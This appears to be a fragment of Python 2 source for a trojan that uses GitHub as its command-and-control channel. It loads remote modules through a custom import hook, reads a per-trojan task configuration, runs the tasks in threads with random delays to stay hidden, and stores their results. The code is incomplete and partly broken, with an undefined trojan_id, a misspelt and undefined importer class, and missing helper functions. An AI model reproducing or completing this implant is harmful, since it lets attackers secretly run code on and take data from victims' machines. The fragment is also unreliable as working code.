import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

trojan_config = "%s.json" % trojan_id
data_path	  = "data/%s/" % trojan_id
trojan_modules = []
configured		= False
task_queue		= Queue.Queue()

def module_runner(module):
	task_queue.put(1)
	result = sys.modules[module].run()
	task_queue.get()

	store_module_result(result)

	return

sys.meta_path = [Gitimkporter()]

while True:
	if task_queue.empty():
		config = get_trojan_config()

		for task in config:
			t = threading.Thread(target = module_runner, args =
					(task['module'],))
			t.start()
			time.sleep(random.randint(1, 10))

	time.sleep(random.randint(1000, 1000))

